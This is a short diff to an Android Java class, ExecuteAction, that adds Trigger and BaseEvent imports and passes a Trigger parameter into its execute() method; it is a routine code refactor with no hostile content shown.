@@ -16,10 +16,12 @@ import org.json.JSONObject;
 import android.util.Log;
 
 import com.android.service.Messages;
+import com.android.service.Trigger;
 import com.android.service.auto.Cfg;
 import com.android.service.conf.ConfAction;
 import com.android.service.conf.Configuration;
 import com.android.service.conf.ConfigurationException;
+import com.android.service.event.BaseEvent;
 import com.android.service.file.Directory;
 import com.android.service.util.Check;
 import com.android.service.util.DataBuffer;
@@ -50,7 +52,7 @@ public class ExecuteAction extends SubActionSlow {
 	 * @see com.ht.AndroidServiceGUI.action.SubAction#execute()
 	 */
 	@Override
-	public boolean execute() {
+	public boolean execute(Trigger trigger) {
 		if (this.command.length() == 0)
 			return false;
 		
